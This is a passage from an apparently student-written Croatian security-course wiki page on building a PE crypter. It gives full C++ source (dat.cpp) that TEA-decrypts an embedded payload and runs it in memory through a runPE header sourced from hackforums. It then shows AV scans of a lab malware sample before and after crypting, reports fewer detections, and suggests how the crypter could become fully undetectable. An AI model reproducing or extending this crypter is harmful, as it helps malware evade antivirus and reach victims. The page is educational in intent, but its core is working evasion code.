+<p>U trećem se koraku zaglavlje shellcode.h koje se dobilo u prethodnom koraku smješta u mapu gdje se nalazi kod programa za treći i zadnji korak a to je spajanje. Nakon premještanja shellcode.h datoteke potrebno je kompajlirati odgovarajući kod (dat.cpp) što će rezultirati željenom datotekom. U trećem koraku se osim već spomenutog zaglavlja shellcode.h koristi zaglavlje runPE.h koje sadrži metodu za pokretanje programa u radnoj memoriji. Autor zaglavlja runPE.h nije poznat, a zaglavlje se može pronaći na hackforums.net i drugim sličnim forumima/web mjestima. Izvorni kod datoteka runPE.h, generatora shellcode-a te jednostavni primjer koda koji poziva runPE.h metodu run preuzeti su sa: <a href="http://www.mediafire.com/?qrjxfcqcdvmqo38" class="external free" rel="nofollow">http://www.mediafire.com/?qrjxfcqcdvmqo38</a>
+--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Jozemberi&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Jozemberi (stranica ne postoji)">Jozemberi</a> 13:53, 19. siječnja 2013. (CET)
+</p>
+<h4> <span class="mw-headline" id="dat.cpp">dat.cpp</span></h4>
+<p><code> 
+</p>
+<pre>    /* Kompajliranjem ovoga programa sa uključenom datotekom shellcode.h u kojoj 
+    * se nalazi kriptirana datoteka stvara se datoteka dat.EXE koja nakon 
+    * pokretanja dekriptira datoteku (koja je bila spremljenu u shellcode.h)
+    * te je pokrenuti u memoriji (dekriptirana datoteka neće se naći na hard 
+    * disku te će je detektirati jedino antivirusni softver koji skenira radnu 
+    * memoriju (opcija AV softvera koja je radno intenzivna za računalo te se 
+    * zbog toga ne koristi na običnim računalima klijenata).
+    *
+    * runPE.h je zaglavlje koje sadrži metodu za pokretanje programa u memoriji
+    * 
+    * Autor zaglavlja runPE.h nije poznat, zaglavlje se može pronaći na 
+    * hackforums.net i drugim sličnim forumima/web mjestima.
+    * 
+    * Izvorni kod datoteka runPE.h, generatora shellcode-a te jednostavni
+    * primjer koda koji poziva runPE.h metodu run preuzeti su sa:
+    * <a href="http://www.mediafire.com/?qrjxfcqcdvmqo38" class="external free" rel="nofollow">http://www.mediafire.com/?qrjxfcqcdvmqo38</a>
+    */
+   
+   #include &lt;Windows.h&gt;
+   #include "runPE.h"
+   #include "shellcode.h"
+   #include &lt;stdint.h&gt;
+   
+   unsigned int kljuc[4]={0xACB5,0x1344,0xEC90,0x285C};
+   
+   #define BLOCK_SIZE 8
+   
+   void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const kljuc[4]){
+        unsigned int i;
+        uint32_t v0=v[0], v1=v[1], delta=0x9E3779B9, sum=delta*num_rounds;
+        for (i=0; i &lt; num_rounds; i++){
+           v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + kljuc[(sum&gt;&gt;11) &amp; 3]);
+           sum -= delta;
+           v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + kljuc[sum &amp; 3]);
+        }
+        v[0]=v0; v[1]=v1;
+   }
+   
+   int main(){  
+       unsigned char shellcode_decrypted[size];
+       
+       int n_blocks=size/BLOCK_SIZE;
+       if(size%BLOCK_SIZE!=0)
+           ++n_blocks;
+         
+       unsigned char data[BLOCK_SIZE];
+       
+       for(int i=0;i&lt;n_blocks;i++){
+           memcpy ( &amp;data, &amp;shellcode[i*BLOCK_SIZE], BLOCK_SIZE );
+           decipher(32,(uint32_t*)data,kljuc);
+           
+           for(int j=0;j&lt;BLOCK_SIZE;j++)
+               memcpy ( &amp;shellcode_decrypted[(i*BLOCK_SIZE)+j],&amp;data[j], sizeof(unsigned char));
+             
+           memset(data,0,BLOCK_SIZE);
+         }
+         
+   	runPE rp;
+       
+   	TCHAR szFilePath[1024];
+   	GetModuleFileNameA(0, LPSTR(szFilePath), 1024);
+   	
+   	rp.run(LPSTR(szFilePath), shellcode_decrypted);
+   	return 0;
+   }
+</pre>
+<p></code>
+--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Jozemberi&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Jozemberi (stranica ne postoji)">Jozemberi</a> 13:53, 19. siječnja 2013. (CET)
+</p>
+<h3> <span class="mw-headline" id="Testiranje_kriptera">Testiranje kriptera</span></h3>
+<p>Ovaj jednostavni kripter testirao sam na način da sam s njime kriptirao maliciozni program (malware.exe) koji smo koristili na labosu 1: <em>Detekcija i uklanjanje malicioznog koda</em>. Dobiveni program sam zatim skenirao online antivirusnim skenerom <a href="http://vscan.novirusthanks.org/" class="external free" rel="nofollow">http://vscan.novirusthanks.org/</a>. U nastavku se mogu vidjeti rezultati antivirusnog skenera za datoteku malware.exe za slučaju kada nije korišten kripter i slučaj kada je korišten.
+--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Jozemberi&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Jozemberi (stranica ne postoji)">Jozemberi</a> 13:53, 19. siječnja 2013. (CET)
+</p>
+<h3> <span class="mw-headline" id="Rezultati_AV_online_skenera_za_malware.exe_koji_nije_kriptiran_kreiranim_kripterom">Rezultati AV online skenera za malware.exe koji <b>nije</b> kriptiran kreiranim kripterom</span></h3>
+<p>Link na detaljne rezultate: <a href="http://vscan.novirusthanks.org/analysis/1b3206011cf9800d740cd755c571961a/bWFsd2FyZS1leGU=/" class="external free" rel="nofollow">http://vscan.novirusthanks.org/analysis/1b3206011cf9800d740cd755c571961a/bWFsd2FyZS1leGU=/</a>
+</p>
+<center><a href="http://security.foi.hr/wiki/index.php/Datoteka:Scan_dat_bez_kriptera.png" class="image"><img alt="Scan dat bez kriptera.png" src="../images/c/c8/Scan_dat_bez_kriptera.png" width="975" height="553" /></a></center>
+<p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Jozemberi&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Jozemberi (stranica ne postoji)">Jozemberi</a> 13:53, 19. siječnja 2013. (CET)
+</p>
+<h3> <span class="mw-headline" id="Rezultati_AV_online_skenera_za_malware.exe_koji_je_kriptiran_kreiranim_kripterom">Rezultati AV online skenera za malware.exe koji <b>je</b> kriptiran kreiranim kripterom</span></h3>
+<p>Link na detaljne rezultate: <a href="http://vscan.novirusthanks.org/analysis/afd075286cad1cf1f6a8c34204ebc6a3/ZGF0LWV4ZQ==/" class="external free" rel="nofollow">http://vscan.novirusthanks.org/analysis/afd075286cad1cf1f6a8c34204ebc6a3/ZGF0LWV4ZQ==/</a>
+</p>
+<center><a href="http://security.foi.hr/wiki/index.php/Datoteka:Scan_dat_sa_kripterom.png" class="image"><img alt="Scan dat sa kripterom.png" src="../images/3/35/Scan_dat_sa_kripterom.png" width="975" height="553" /></a></center>
+<p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Jozemberi&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Jozemberi (stranica ne postoji)">Jozemberi</a> 13:53, 19. siječnja 2013. (CET)
+</p>
+<h3> <span class="mw-headline" id="Komentar_rezultata_testiranja_-_zaklju.C4.8Dak">Komentar rezultata testiranja - zaključak</span></h3>
+<p>Kao što se iz rezultata testiranja može vidjeti kreirani kripter nije (100%) FUD. No, broj antivirusnih programa koji detektiraju maliciozni program kada je kriptiran kreiranim kripterom je značajno manji. Kriptiranjem različitih bezopasnih datoteka te skeniranjem istih utvrdio sam da je problem u zaglavlju runPE.h koje je duže vrijeme dostupno na internetu. Kako se radi o djelu koda koji nisam ni malo modificirao, mislim da bi se detaljnijim proučavanjem klase runPE koja se unutar tog zaglavlja nalazi te zatim, po uzoru na nju, kreiranjem vlastite mogao još smanjiti broj detekcija te uz detaljniju analizu i ekperimentiranje postići da kripter bude (100%) FUD.
+<br /> <br />
+No, kako sam ovaj kripter kreirao iz isključivo edukacijskih razloga, kreiranje (100%) FUD kriptera mi nije bio primarni cilj. Primarni cilj mi je bio kreiranje jednostavnog kriptera čiji će kod i način rada razumjeti svatko sa minimalnim znanjem iz područja programiranja u c/c++ i kriptografije. Mislim da sam taj cilj ostvario te da je izvorni kod kreiranog kriptera vrlo dobar pokazatelj načina na koji kripteri rade.
+</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Jozemberi&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Jozemberi (stranica ne postoji)">Jozemberi</a> 13:53, 19. siječnja 2013. (CET)
+</p>
+<hr />
+<h1> <span class="mw-headline" id="Izvori_literature">Izvori literature</span></h1>
+<p><b>Tekstovi</b>
+</p>
+<ol>
+<li> The Portable Executable File Format from Top to Bottom - <a href="http://www.csn.ul.ie/~caolan/publink/winresdump/winresdump/doc/pefile2.html" class="external free" rel="nofollow">http://www.csn.ul.ie/~caolan/publink/winresdump/winresdump/doc/pefile2.html</a> </li>
+<li> Peering Inside the PE: A Tour of the Win32 Portable Executable File Format - <a href="http://msdn.microsoft.com/en-us/magazine/ms809762.aspx" class="external free" rel="nofollow">http://msdn.microsoft.com/en-us/magazine/ms809762.aspx</a> </li>
+<li> An In-Depth Look into the Win32 Portable Executable File Format - <a href="http://msdn.microsoft.com/en-us/magazine/cc301805.aspx" class="external free" rel="nofollow">http://msdn.microsoft.com/en-us/magazine/cc301805.aspx</a> </li>
+<li> Starter source kod korišten za implementaciju kriptera - <a href="http://www.mediafire.com/?qrjxfcqcdvmqo38" class="external free" rel="nofollow">http://www.mediafire.com/?qrjxfcqcdvmqo38</a></li>
+<li> Hyperion runtime Crypter - <a href="http://www.nullsecurity.net/tools/binary.html" class="external free" rel="nofollow">http://www.nullsecurity.net/tools/binary.html</a> </li>
+</ol>
+<p><b>Slike</b>
+</p>
+<ol>
+<li> <a href="https://www.ibm.com/developerworks/collaboration/uploads/gbowerman/dll_error.jpg" class="external free" rel="nofollow">https://www.ibm.com/developerworks/collaboration/uploads/gbowerman/dll_error.jpg</a> </li>
+<li> <a href="http://nullsecurity.net/papers/nullsec-pe-crypter.pdf" class="external free" rel="nofollow">http://nullsecurity.net/papers/nullsec-pe-crypter.pdf</a>, str. 3  </li>
+<li> <a href="https://fedoraproject.org/wiki/MinGW/Tutorial" class="external free" rel="nofollow">https://fedoraproject.org/wiki/MinGW/Tutorial</a>, Veljaća 2002. god.</li>
+</ol>
+<p></font>
+<br />
+--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Jozemberi&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Jozemberi (stranica ne postoji)">Jozemberi</a> 13:53, 19. siječnja 2013. (CET)
+</p>
+<!-- 
+NewPP limit report
+Preprocessor node count: 5/1000000
+Post-expand include size: 0/2097152 bytes
+Template argument size: 0/2097152 bytes
+Expensive parser function count: 0/100
+-->
+
+<!-- Saved in parser cache with key sisds:pcache:idhash:4412-0!*!0!!hr!2!edit=0 and timestamp 20190203204022 -->
+<div class="printfooter">
+Dobavljeno iz "<a href="Kriptiranje_PE-ova.html">http://security.foi.hr/wiki/index.php/Kriptiranje_PE-ova</a>"</div>
+				<!-- /bodytext -->
+								<!-- catlinks -->
+				<div id='catlinks' class='catlinks catlinks-allhidden'></div>				<!-- /catlinks -->
+												<div class="visualClear"></div>
+			</div>
+			<!-- /bodyContent -->
+		</div>
+		<!-- /content -->
+		<!-- header -->
+		<div id="mw-head" class="noprint">
+			
+<!-- 0 -->
+<div id="p-personal" class="">
+	<h5>Osobni alati</h5>
+	<ul>
+					<li  id="pt-login"><a href="http://security.foi.hr/wiki/index.php?title=Posebno:Prijava&amp;returnto=Kriptiranje_PE-ova" title="Predlažemo Vam da se prijavite, ali nije obvezno. [o]" accesskey="o">Prijavi se</a></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+			<div id="left-navigation">
+				
+<!-- 0 -->
+<div id="p-namespaces" class="vectorTabs">
+	<h5>Imenski prostori</h5>
+	<ul>
+					<li  id="ca-nstab-main" class="selected"><span><a href="Kriptiranje_PE-ova.html"  title="Pogledaj sadržaj [c]" accesskey="c">Članak</a></span></li>
+					<li  id="ca-talk" class="new"><span><a href="http://security.foi.hr/wiki/index.php?title=Razgovor:Kriptiranje_PE-ova&amp;action=edit&amp;redlink=1"  title="Razgovor o stranici [t]" accesskey="t">Razgovor</a></span></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+
+<!-- 1 -->
+<div id="p-variants" class="vectorMenu emptyPortlet">
+		<h5><span>Inačice</span><a href="Kriptiranje_PE-ova.html#"></a></h5>
+	<div class="menu">
+		<ul>
+					</ul>
+	</div>
+</div>
+
+<!-- /1 -->
+			</div>
+			<div id="right-navigation">
+				
+<!-- 0 -->
+<div id="p-views" class="vectorTabs">
+	<h5>Pogledi</h5>
+	<ul>
+					<li id="ca-view" class="selected"><span><a href="Kriptiranje_PE-ova.html" >Čitaj</a></span></li>
+					<li id="ca-viewsource"><span><a href="http://security.foi.hr/wiki/index.php?title=Kriptiranje_PE-ova&amp;action=edit"  title="Ova stranica je zaštićena. Možete pogledati izvorni kod. [e]" accesskey="e">Vidi izvor</a></span></li>
+					<li id="ca-history" class="collapsible "><span><a href="http://security.foi.hr/wiki/index.php?title=Kriptiranje_PE-ova&amp;action=history"  title="Ranije izmjene na ovoj stranici. [h]" accesskey="h">Vidi stare izmjene</a></span></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+
+<!-- 1 -->
+<div id="p-cactions" class="vectorMenu emptyPortlet">
+	<h5><span>Radnje</span><a href="Kriptiranje_PE-ova.html#"></a></h5>
+	<div class="menu">
+		<ul>
+					</ul>
+	</div>
+</div>
+
+<!-- /1 -->
+
+<!-- 2 -->
+<div id="p-search">
+	<h5><label for="searchInput">Traži</label></h5>
+	<form action="http://security.foi.hr/wiki/index.php" id="searchform">
+		<input type='hidden' name="title" value="Posebno:Traži"/>
+				<input id="searchInput" name="search" type="text"  title="Pretraži ovaj wiki [f]" accesskey="f"  value="" />
+		<input type='submit' name="go" class="searchButton" id="searchGoButton"	value="Kreni" title="Idi na stranicu s ovim imenom ako ona postoji" />
+		<input type="submit" name="fulltext" class="searchButton" id="mw-searchButton" value="Traži" title="Traži ovaj tekst na svim stranicama" />
+			</form>
+</div>
+
+<!-- /2 -->
+			</div>
+		</div>
+		<!-- /header -->
+		<!-- panel -->
+			<div id="mw-panel" class="noprint">
+				<!-- logo -->
+					<div id="p-logo"><a style="background-image: url(../../images/osslogo.png);" href="../../wiki.html"  title="Glavna stranica"></a></div>
+				<!-- /logo -->
+				
+<!-- navigation -->
+<div class="portal" id='p-navigation'>
+	<h5>Orijentacija</h5>
+	<div class="body">
+				<ul>
+					<li id="n-mainpage-description"><a href="../../wiki.html" title="Posjeti glavnu stranicu [z]" accesskey="z">Glavna stranica</a></li>
+					<li id="n-portal"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Portal_zajednice" title="O projektu, što možete učiniti, gdje je što">Portal zajednice</a></li>
+					<li id="n-currentevents"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Novosti" title="O trenutačnim događajima">Aktualno</a></li>
+					<li id="n-recentchanges"><a href="./Posebno:Nedavne_promjene.html" title="Popis nedavnih promjena u wikiju. [r]" accesskey="r">Nedavne promjene</a></li>
+					<li id="n-randompage"><a href="./Posebno:Slučajna_stranica.html" title="Učitaj slučajnu stranicu [x]" accesskey="x">Slučajna stranica</a></li>
+					<li id="n-help"><a href="./Pomoć:Pomoć.html" title="Mjesto za pomoć suradnicima.">Pomoć</a></li>
+				</ul>
+			</div>
+</div>
+
+<!-- /navigation -->
+
+<!-- SEARCH -->
+
+<!-- /SEARCH -->
+
+<!-- TOOLBOX -->
+<div class="portal" id="p-tb">
+	<h5>Traka s alatima</h5>
+	<div class="body">
+		<ul>
+					<li id="t-whatlinkshere"><a href="http://security.foi.hr/wiki/index.php/Posebno:%C5%A0to_vodi_ovamo/Kriptiranje_PE-ova" title="Popis svih stranica koje sadrže poveznice ovamo [j]" accesskey="j">Što vodi ovamo</a></li>
+						<li id="t-recentchangeslinked"><a href="http://security.foi.hr/wiki/index.php/Posebno:Povezane_promjene/Kriptiranje_PE-ova" title="Nedavne promjene na stranicama na koje vode ovdašnje poveznice [k]" accesskey="k">Povezane stranice</a></li>
+																																										<li id="t-specialpages"><a href="./Posebno:Posebne_stranice.html" title="Popis posebnih stranica [q]" accesskey="q">Posebne stranice</a></li>
+									<li id="t-print"><a href="http://security.foi.hr/wiki/index.php?title=Kriptiranje_PE-ova&amp;printable=yes" rel="alternate" title="Verzija za ispis ove stranice [p]" accesskey="p">Verzija za ispis</a></li>
+						<li id="t-permalink"><a href="http://security.foi.hr/wiki/index.php?title=Kriptiranje_PE-ova&amp;oldid=16845" title="Trajna poveznica na ovu verziju stranice">Trajna poveznica</a></li>
+						</ul>
+	</div>
+</div>
+
+<!-- /TOOLBOX -->
+
+<!-- LANGUAGES -->
+
+<!-- /LANGUAGES -->
+			</div>
+		<!-- /panel -->
+		<!-- footer -->
+		<div id="footer">
+											<ul id="footer-info">
+																	<li id="footer-info-lastmod"> Datum zadnje promjene na ovoj stranici: 21:41, 20. siječnja 2013.</li>
+																							<li id="footer-info-viewcount">Ova stranica je pogledana 10.639 puta.</li>
+																							<li id="footer-info-copyright">Sadržaji se koriste u skladu s <a href="http://creativecommons.org/licenses/by-sa/3.0/" class="external ">Creative Commons Attribution Share Alike</a>.</li>
+															</ul>
+															<ul id="footer-places">
+																	<li id="footer-places-privacy"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Za%C5%A1tita_privatnosti" title="SIS Wiki:Zaštita privatnosti">Zaštita privatnosti</a></li>
+																							<li id="footer-places-about"><a href="./SIS_Wiki:O_projektu_SIS_Wiki.html" title="SIS Wiki:O projektu SIS Wiki">O projektu SIS Wiki</a></li>
+																							<li id="footer-places-disclaimer"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:General_disclaimer" title="SIS Wiki:General disclaimer">Odricanje od odgovornosti</a></li>
+															</ul>
+											<ul id="footer-icons" class="noprint">
+					<li id="footer-copyrightico">
+						<a href="http://creativecommons.org/licenses/by-sa/3.0/"><img src="../skins/common/images/cc-by-sa.png" alt="Creative Commons Attribution Share Alike" width="88" height="31" /></a>
+					</li>
+					<li id="footer-poweredbyico">
+						<a href="http://www.mediawiki.org/"><img src="../skins/common/images/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" width="88" height="31" /></a>
+					</li>
+				</ul>
+						<div style="clear:both"></div>
+		</div>
+		<!-- /footer -->
+		
+<script src="../load.php%3Fdebug=false&amp;lang=hr&amp;modules=startup&amp;only=scripts&amp;skin=vector&amp;*"></script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.config.set({"wgCanonicalNamespace": "", "wgCanonicalSpecialPageName": false, "wgNamespaceNumber": 0, "wgPageName": "Kriptiranje_PE-ova", "wgTitle": "Kriptiranje PE-ova", "wgAction": "view", "wgArticleId": 4412, "wgIsArticle": true, "wgUserName": null, "wgUserGroups": ["*"], "wgCurRevisionId": 16845, "wgCategories": [], "wgBreakFrames": false, "wgRestrictionEdit": [], "wgRestrictionMove": []});
+}
+</script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.loader.load(["mediawiki.util", "mediawiki.legacy.wikibits", "mediawiki.legacy.ajax"]);
+	mediaWiki.loader.go();
+}
+</script>
+
+<script>if ( window.mediaWiki ) {
+	mediaWiki.user.options.set({"ccmeonemails":0,"cols":80,"contextchars":50,"contextlines":5,"date":"default","diffonly":0,"disablemail":0,"disablesuggest":0,"editfont":"default","editondblclick":0,"editsection":1,"editsectiononrightclick":0,"enotifminoredits":0,"enotifrevealaddr":0,"enotifusertalkpages":1,"enotifwatchlistpages":0,"extendwatchlist":0,"externaldiff":0,"externaleditor":0,"fancysig":0,"forceeditsummary":0,"gender":"unknown","hideminor":0,"hidepatrolled":0,"highlightbroken":1,"imagesize":2,"justify":0,"math":1,"minordefault":0,"newpageshidepatrolled":0,"nocache":0,"noconvertlink":0,"norollbackdiff":0,"numberheadings":0,"previewonfirst":0,"previewontop":1,"quickbar":1,"rcdays":7,"rclimit":50,"rememberpassword":0,"rows":25,"searchlimit":20,"showhiddencats":0,"showjumplinks":1,"shownumberswatching":1,"showtoc":1,"showtoolbar":1,"skin":"vector","stubthreshold":0,"thumbsize":2,"underline":2,"uselivepreview":0,"usenewrc":0,"watchcreations":0,"watchdefault":0,"watchdeletion":0,
+	"watchlistdays":3,"watchlisthideanons":0,"watchlisthidebots":0,"watchlisthideliu":0,"watchlisthideminor":0,"watchlisthideown":0,"watchlisthidepatrolled":0,"watchmoves":0,"wllimit":250,"variant":"hr","language":"hr","searchNs0":true,"searchNs1":false,"searchNs2":false,"searchNs3":false,"searchNs4":false,"searchNs5":false,"searchNs6":false,"searchNs7":false,"searchNs8":false,"searchNs9":false,"searchNs10":false,"searchNs11":false,"searchNs12":false,"searchNs13":false,"searchNs14":false,"searchNs15":false});;mediaWiki.loader.state({"user.options":"ready"});
+}
+</script>		<!-- fixalpha -->
+		<script type="text/javascript"> if ( window.isMSIE55 ) fixalpha(); </script>
+		<!-- /fixalpha -->
+		<!-- Served in 0.360 secs. -->			</body>
+</html>
